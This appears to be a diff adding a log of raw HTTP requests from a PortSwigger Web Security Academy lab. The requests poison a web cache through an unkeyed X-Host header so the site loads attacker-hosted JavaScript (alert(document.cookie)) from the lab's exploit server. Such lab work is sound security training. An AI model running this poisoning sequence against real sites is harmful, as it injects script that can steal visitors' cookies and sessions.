@@ -1,0 +1,39 @@
+GET / HTTP/1.1
+Host: acd91f6f1f0c8ba8c077410d00c500cf.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+GET / HTTP/1.1
+Host: acd91f6f1f0c8ba8c077410d00c500cf.web-security-academy.net
+x-host: exploit-accb1fea1f728bf9c0d6414201e200c5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+POST / HTTP/1.1
+Host: exploit-accb1fea1f728bf9c0d6414201e200c5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+urlIsHttps=on&responseFile=%2Fresources%2Fjs%2Ftracking.js&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8&responseBody=Hello%2C+world%21&formAction=STORE
+
+GET /log HTTP/1.1
+Host: exploit-accb1fea1f728bf9c0d6414201e200c5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+POST /post/comment HTTP/1.1
+Host: acd91f6f1f0c8ba8c077410d00c500cf.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+csrf=xjYp0WZDi2ryU9XwibMkKAdI4xLDEJPk&postId=4&comment=%3Cimg+src%3D%22https%3A%2F%2Fexploit-accb1fea1f728bf9c0d6414201e200c5.web-security-academy.net%2Ffoo%22+%2F%3E&name=aaaaa&email=aaaaa%40aaaaa&website=http%3A%2F%2Faaaaa
+
+GET /post/comment/confirmation?postId=4 HTTP/1.1
+Host: acd91f6f1f0c8ba8c077410d00c500cf.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+POST / HTTP/1.1
+Host: exploit-accb1fea1f728bf9c0d6414201e200c5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+urlIsHttps=on&responseFile=%2Fresources%2Fjs%2Ftracking.js&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8&responseBody=alert%28document.cookie%29&formAction=STORE
+
+GET / HTTP/1.1
+Host: acd91f6f1f0c8ba8c077410d00c500cf.web-security-academy.net
+x-host: exploit-accb1fea1f728bf9c0d6414201e200c5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
